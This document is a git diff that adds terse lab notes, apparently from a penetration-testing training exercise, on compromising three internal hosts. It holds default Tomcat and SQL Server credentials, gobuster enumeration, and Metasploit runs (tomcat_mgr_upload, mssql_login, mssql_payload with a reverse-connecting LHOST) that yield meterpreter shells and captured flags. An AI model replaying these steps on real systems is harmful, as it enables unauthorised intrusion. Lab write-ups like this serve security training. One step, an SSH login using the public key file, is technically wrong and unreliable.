@@ -62,3 +62,120 @@ PORT     STATE SERVICE VERSION
 |_http-server-header: Apache-Coyote/1.1
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
+
+[+]TOMCAT
+http://172.16.64.101:8080/manager/html
+user : tomcat
+pass : s3cret
+
+[+]METASPLOIT
+msf6 exploit(multi/http/tomcat_mgr_upload) > exploit
+
+[+]FLAGS BOX1[+]
+meterpreter > ls
+Listing: /home/adminels/Desktop
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  12    fil   2020-03-27 10:17:53 +0100  flag.txt
+
+meterpreter > cat flag.txt
+You did it!
+
+
+
+meterpreter > cat flag.txt
+Congratulations, you got it!
+meterpreter > pwd
+/home/developer
+meterpreter > 
+
+
+[+]BOX 2[+]
+/img                  (Status: 301) [Size: 312] [--> http://172.16.64.140/img/]
+/css                  (Status: 301) [Size: 312] [--> http://172.16.64.140/css/]
+/project              (Status: 401) [Size: 460]    
+
+
+http://172.16.64.140/project/
+user : admin
+pass : admin
+
+[+]ENUMERATION[+]
+gobuster dir -u http://172.16.64.140/project -w /usr/share/wordlists/dirb/big.txt -U admin -P admin -t 50
+backup               (Status: 301) [Size: 323] [--> http://172.16.64.140/project/backup/]
+/css                  (Status: 301) [Size: 320] [--> http://172.16.64.140/project/css/]   
+/images               (Status: 301) [Size: 323] [--> http://172.16.64.140/project/images/]
+/includes             (Status: 403) [Size: 304] 
+
+
+
+gobuster dir -u http://172.16.64.140/project/backup -w /usr/share/wordlists/dirb/big.txt -U admin -P admin -t 50
+/test                 (Status: 301) [Size: 328] [--> http://172.16.64.140/project/backup/test/]
+
+￼	asdasd.txt		 
+￼	dsadasda.txt	
+￼	sdadas.txt	
+￼	test1.txt	
+￼	todo.txt
+
+
+http://172.16.64.140/project/backup/test/sdadas.txt
+Driver={SQL Server};Server=foosql.foo.com;Database=;Uid=fooadmin;Pwd=fooadmin;
+/var/www/html/project/354253425234234/flag.txt
+
+
+[+]METASPLOIT[+]
+[+][+]El módulo mssql_login de Metasploit puede ayudarnos a verificar primero si las credenciales identificadas son válidas, de la siguiente manera.
+auxiliary/scanner/mssql/mssql_login   MSSQL Login Utility
+set RHOST 172.16.64.199
+set username fooadmin
+set password fooadmin
+exploit
+[+] 172.16.64.199:1433    - 172.16.64.199:1433 - Login Successful: WORKSTATION\fooadmin:fooadmin
+
+
+[+][+]El módulo mssql_enum de Metasploit puede ayudarnos a automatizar el reconocimiento contra SQL Server, de la siguiente manera.
+use auxiliary/admin/mssql/mssql_enum
+
+[+]System Admin Logins on this Server:
+[+]Microsoft SQL Server 2014 - 12.0.2000.8 (X64)
+[*] 172.16.64.199:1433 - 	xp_cmdshell is Enabled
+[*] 172.16.64.199:1433 - 	remote access is Enabled
+[*] 172.16.64.199:1433 - 	WIN10\AdminELS
+
+[+][+]Podemos comprometer completamente el servidor SQL, a través del módulo mssql_payload de Metasploit , de la siguiente manera.
+use exploit/windows/mssql/mssql_payload
+set RHOST 172.16.64.199
+set LHOST 172.16.64.10
+set username fooadmin
+set password fooadmin
+run
+
+meterpreter > ls
+Listing: C:\Users\AdminEls\Desktop
+==================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  853   fil   2019-03-12 13:31:52 +0100  HeidiSQL.lnk
+100666/rw-rw-rw-  282   fil   2017-12-15 23:42:58 +0100  desktop.ini
+100666/rw-rw-rw-  47    fil   2019-04-02 12:13:19 +0200  flag.txt
+100666/rw-rw-rw-  632   fil   2019-03-13 07:58:33 +0100  id_rsa.pub
+
+
+meterpreter > cat flag.txt
+Congratulations! You exploited this machine! 
+
+meterpreter > cat id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAlGWzjgKVHcpaDFvc6877t6ZT2ArQa+OiFteRLCc6TpxJ/lQFEDtmxjTcotik7V3DcYrIv3UsmNLjxKpEJpwqELGBfArKAbzjWXZE0VubmBQMHt4WmBMlDWGcKu8356blxom+KR5S5o+7CpcL5R7UzwdIaHYt/ChDwOJc5VK7QU46G+T9W8aYZtvbOzl2OzWj1U6NSXZ4Je/trAKoLHisVfq1hAnulUg0HMQrPCMddW5CmTzuEAwd8RqNRUizqsgIcJwAyQ8uPZn5CXKWbE/p1p3fzAjUXBbjB0c7SmXzondjmMPcamjjTTB7kcyIQ/3BQfBya1qhjXeimpmiNX1nnQ== rsa-key-20190313###
+ssh://developer:dF3334slKw@172.16.64.182:22#############################################################################################################################################################################################
+
+
+[+]BOX 3[+]
+ssh developer@172.16.64.182 -i id_rsa.pub
+passwd : dF3334slKw
+
+developer@xubuntu:~$ cat flag.txt 
+Congratulations, you got it!
